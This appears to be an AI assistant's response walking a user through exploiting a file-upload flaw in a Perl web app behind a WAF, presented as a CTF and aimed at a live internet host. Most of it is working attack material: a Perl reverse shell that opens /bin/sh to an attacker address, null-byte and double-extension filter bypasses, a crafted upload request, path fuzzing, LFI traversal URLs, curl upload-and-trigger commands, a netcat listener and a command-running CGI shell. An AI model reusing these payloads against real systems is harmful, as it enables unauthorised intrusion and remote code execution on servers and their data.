To exploit the **file upload vulnerability** in the provided CTF, particularly targeting a **Perl-based web app with a WAF in place**, here’s a clear **step-by-step PoC** for bypassing security mechanisms and achieving **RCE or LFI to get the flag**.

---

### 🎯 Objective:

Use the file upload functionality to:

1. Upload a shell.
2. Trigger it to run commands like `grep -r "P3RL_B3AST" /home /opt /var /tmp 2>/dev/null`.
3. Retrieve the flag using either the filename or the content (`P3RL_B3AST`).

---

## 🔧 1. Prepare the Malicious File (Perl-based Web Shell)

Since the server is **Perl-based**, and PHP may not work, prepare a **Perl shell** or use a **valid extension bypass** with a file that will get interpreted and executed (if misconfigured).

If you’re not sure which extensions are allowed, try:

```
shell.pl
shell.txt
shell.pl;.jpg
shell.pl%00.jpg
```

#### Example Perl Reverse Shell (`rev.pl`):

```perl
#!/usr/bin/perl
use Socket;
$i="YOUR_IP";$p=YOUR_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");
open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
```

### 🎯 Payload tip for RCE:

If Perl isn't executed, try uploading **bash** or **sh** shell wrapped in `.txt` or `.jpg` and then trigger via **LFI**.

---

## 📤 2. Modify Burp Request for Upload

Send the request to Burp Repeater. Modify:

- **Content-Type** to `multipart/form-data`
- **Filename** to bypass extension filters
- **Content-Disposition** correctly

**Example modified POST request**:

```http
POST /upload HTTP/1.1
Host: hacksmith.webhop.me:5565
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Content-Length: ...

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="rev.pl%00.jpg"
Content-Type: application/octet-stream

[Insert shell content here]

------WebKitFormBoundary--
```

🛡 **WAF Bypass Tips**:

- Use **double extensions**: `rev.pl.jpg`
- Null byte `%00` to terminate extension
- Obfuscate using content-type changes

---

## 🔎 3. Discover the Upload Path

Try common paths:

- `/uploads/rev.pl`
- `/upload/rev.pl`
- `/files/rev.pl`
- `/images/rev.pl`
- `/rev.pl`

Use **Burp Intruder** or `ffuf` to fuzz upload directory:

```bash
ffuf -u http://hacksmith.webhop.me:5565/FUZZ -w paths.txt
```

---

## 🖥 4. Trigger the Shell

If shell is working and you get a reverse shell:

```bash
grep -r "P3RL_B3AST" /home /opt /tmp /var 2>/dev/null
```

Or, embed this in the shell directly if it’s one-shot execution.

---

## 💣 5. If LFI Exists

If you discover LFI:

- Try accessing the uploaded file path.
- If `/etc/passwd` works, include your uploaded shell:

```bash
http://hacksmith.webhop.me:5565/index.pl?page=../../../../uploads/rev.pl
```

If you don’t have RCE, use LFI to include `/proc/self/environ`, `access.log`, etc.

---

## ✅ Final Fully-Automated PoC (without Python, using curl)

1. Upload shell:

```bash
curl -X POST http://hacksmith.webhop.me:5565/upload \
 -F "file=@rev.pl;filename=rev.pl%00.jpg" \
 -H "Content-Type: multipart/form-data"
```

2. Trigger it (replace path accordingly):

```bash
curl http://hacksmith.webhop.me:5565/uploads/rev.pl
```

Or use:

```bash
curl http://hacksmith.webhop.me:5565/index.pl?page=../../../../uploads/rev.pl
```

3. Set up your netcat listener:

```bash
nc -lvnp YOUR_PORT
```

---

## 🏁 BONUS: Direct Shell that Greps Flag

If you're uploading a shell, you can write this inside the payload:

```perl
#!/usr/bin/perl
print "Content-type: text/html\n\n";
print `grep -r "P3RL_B3AST" /home /var /opt /tmp 2>/dev/null`;
```

Name it `grep.pl`, upload and then access:

```bash
http://hacksmith.webhop.me:5565/uploads/grep.pl
```

---

## 🏆 Flag Info:

- **Flag ID**: `20c08b01-b30a-4580-95ce-12506c1283ad`
- **Flag Content**: `P3RL_B3AST`

---

If you share upload response + source page showing form inputs or directories, I can fine-tune the exploit further. Want me to generate a `grep.pl` and a ready-to-upload file for you?